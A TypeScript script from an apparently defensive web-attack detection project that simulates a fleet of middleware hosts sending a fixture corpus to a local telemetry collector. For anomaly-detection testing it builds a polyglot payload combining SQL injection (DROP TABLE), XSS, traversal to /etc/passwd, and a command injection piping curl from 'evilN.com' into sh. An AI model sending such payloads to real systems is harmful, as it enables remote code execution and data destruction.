#!/usr/bin/env node
/**
 * Fase 2 of the CT/CI/CD pipeline — simulates N independent logsguardian
 * deployments ("hosts") sending real traffic (the e2e benign+attack corpus)
 * through the actual middleware, each with `telemetryUrl` pointed at a
 * shared MLOps collector and a distinct `sourceId`. Demonstrates that a
 * central collector accumulates vectors from multiple distinct sources
 * without needing real users — see packages/mlops/collector.
 *
 * Run: pnpm --filter @logsguardian/mlops run simulate-fleet
 */
import * as fs from "fs";
import * as path from "path";
import express from "express";
import request from "supertest";
import { logsguardian } from "logsguardian";
import { createCollectorApp } from "./collector/server";

const FLEET_SIZE = 5;
const MODEL_DIR = path.resolve(__dirname, "..", "..", "..", "training", "models");
const FIXTURES_PATH = path.resolve(__dirname, "..", "..", "..", "e2e", "fixtures", "test_payloads.jsonl");
const TELEMETRY_DRAIN_MS = 2000;
const DEFAULT_COLLECTOR_DB = path.resolve(__dirname, "..", "data", "mlops-telemetry.db");
// logsguardian's RF worker fails open (predicted_class="benign", no wait) for any
// request that arrives before its ONNX model finishes loading — see
// packages/core/src/middleware.ts's infer(): "Fail open if RF isn't available yet".
// Hosts are therefore warmed up sequentially (not spun up concurrently) and given
// this pause before real traffic starts, or most/all requests would silently
// mislabel as benign under concurrent worker_thread startup contention.
const RF_WARMUP_MS = 3000;

interface FixtureRecord {
  method: string;
  path: string;
  query: string;
  body: string | null;
  userAgent: string;
  contentType: string;
  referer: string;
  cookie: string;
  _expected_class: string;
}

// Deliberately injected for Fase 3's demo: cross-class polyglot payloads
// blending SQLi + XSS + path traversal + command injection syntax in a
// single request. The training corpus is per-class (each source teaches one
// technique), so a payload combining all four signatures at once produces a
// feature vector combination (high length/entropy/special-char-ratio AND
// simultaneous sqli+xss+traversal+cmdi keyword hits) unlike anything in any
// single-class training source — this is what actually pushes IF's score
// below threshold (an obfuscated-but-single-class payload alone did not, in
// an earlier version of this script; IF scores it near-identical to normal
// attack traffic because the feature values individually stay in-range).
// Sent under its own source_id so the resulting anomaly cluster is
// identifiable afterward.
// One base polyglot template, minor per-request perturbation (varying id/host
// suffix only) — vectors stay close to each other in feature space (same core
// technique "seen from multiple sources") while still being far from every
// single-class training cluster, so they form their own DBSCAN cluster
// instead of scattering as unrelated noise points.
function novelPolyglotQuery(n: number): string {
  return `q='; DROP TABLE users_${n};--<script>alert(String.fromCharCode(88,83,${n}))</script>../../../../etc/passwd_${n};$(curl\${IFS}evil${n}.com|sh)%00%2e%2e%2f`;
}
const NOVEL_TECHNIQUE_QUERIES: string[] = [1, 2, 3, 4, 5, 6].map(novelPolyglotQuery);

function loadFixtures(): FixtureRecord[] {
  return fs
    .readFileSync(FIXTURES_PATH, "utf-8")
    .split("\n")
    .filter(Boolean)
    .map((line) => JSON.parse(line));
}

/** Splits payloads round-robin across N simulated hosts. */
function partitionByHost(records: FixtureRecord[], hostCount: number): FixtureRecord[][] {
  const buckets: FixtureRecord[][] = Array.from({ length: hostCount }, () => []);
  records.forEach((rec, i) => buckets[i % hostCount].push(rec));
  return buckets;
}

function createSimulatedHost(sourceId: string, telemetryUrl: string): express.Express {
  const app = express();
  app.use(express.json());
  app.use(express.urlencoded({ extended: true }));
  app.use(
    logsguardian({
      mode: "monitor",
      modelDir: MODEL_DIR,
      timeoutMs: 10000,
      dbPath: ":memory:",
      telemetryUrl,
      sourceId,
    })
  );
  app.all(/.*/, (_req, res) => res.json({ status: "ok" }));
  return app;
}

async function sendPayload(app: express.Express, rec: FixtureRecord): Promise<void> {
  const hasBody = typeof rec.body === "string" && rec.body.length > 0;
  const rawMethod = (rec.method || (hasBody ? "POST" : "GET")).toLowerCase();
  const SUPPORTED_METHODS = ["get", "post", "put", "delete", "patch"] as const;
  const method = (SUPPORTED_METHODS as readonly string[]).includes(rawMethod)
    ? (rawMethod as (typeof SUPPORTED_METHODS)[number])
    : "get";
  const urlPath = rec.path ? (rec.path.startsWith("/") ? rec.path : `/${rec.path}`) : "/";
  const fullPath = rec.query ? `${urlPath}?${rec.query}` : urlPath;

  let req = request(app)[method](fullPath);
  if (rec.userAgent) req = req.set("User-Agent", rec.userAgent);
  if (rec.contentType) req = req.set("Content-Type", rec.contentType);
  if (rec.referer) req = req.set("Referer", rec.referer);
  if (hasBody) req = req.send(rec.body as string);

  try {
    await req;
  } catch {
    // A single malformed fixture request must not abort the whole run.
  }
}

async function main(): Promise<void> {
  const dbPath = process.env.MLOPS_COLLECTOR_DB ?? DEFAULT_COLLECTOR_DB;
  fs.mkdirSync(path.dirname(dbPath), { recursive: true });
  const { app: collectorApp, store } = createCollectorApp({ dbPath });
  const collectorServer = collectorApp.listen(0);
  await new Promise<void>((resolve) => collectorServer.once("listening", resolve));
  const { port } = collectorServer.address() as { port: number };
  const telemetryUrl = `http://127.0.0.1:${port}/telemetry`;

  const fixtures = loadFixtures();
  const buckets = partitionByHost(fixtures, FLEET_SIZE);

  console.log(`Simulating ${FLEET_SIZE} hosts against collector at ${telemetryUrl}`);
  console.log(`Traffic corpus: ${fixtures.length} records from e2e/fixtures/test_payloads.jsonl\n`);

  for (let i = 0; i < buckets.length; i++) {
    const records = buckets[i];
    const sourceId = `sim-host-${i + 1}`;
    const app = createSimulatedHost(sourceId, telemetryUrl);
    await new Promise((resolve) => setTimeout(resolve, RF_WARMUP_MS));
    for (const rec of records) {
      await sendPayload(app, rec);
    }
    console.log(`  ${sourceId}: sent ${records.length} requests`);
  }

  const novelHost = createSimulatedHost("sim-host-novel", telemetryUrl);
  await new Promise((resolve) => setTimeout(resolve, RF_WARMUP_MS));
  for (const query of NOVEL_TECHNIQUE_QUERIES) {
    await sendPayload(novelHost, { method: "GET", path: "/api/search", query, body: null, userAgent: "", contentType: "", referer: "", cookie: "", _expected_class: "cmdi" });
  }
  console.log(`  sim-host-novel: sent ${NOVEL_TECHNIQUE_QUERIES.length} requests (deliberately novel technique)`);

  // Telemetry is fire-and-forget — give in-flight POSTs time to land before reading the store.
  await new Promise((resolve) => setTimeout(resolve, TELEMETRY_DRAIN_MS));

  console.log(`\nCollector accumulated ${store.count()} telemetry events`);
  console.log(`Distinct sources seen: ${store.sources().join(", ")}`);
  console.log(`Persisted to ${dbPath}`);

  store.close();
  collectorServer.close();
  // supertest's per-request ephemeral listeners and the fire-and-forget
  // telemetry sockets can leave handles open past this point — exit
  // explicitly so the script terminates instead of hanging.
  process.exit(0);
}

if (require.main === module) {
  main().catch((err) => {
    console.error(err);
    process.exit(1);
  });
}
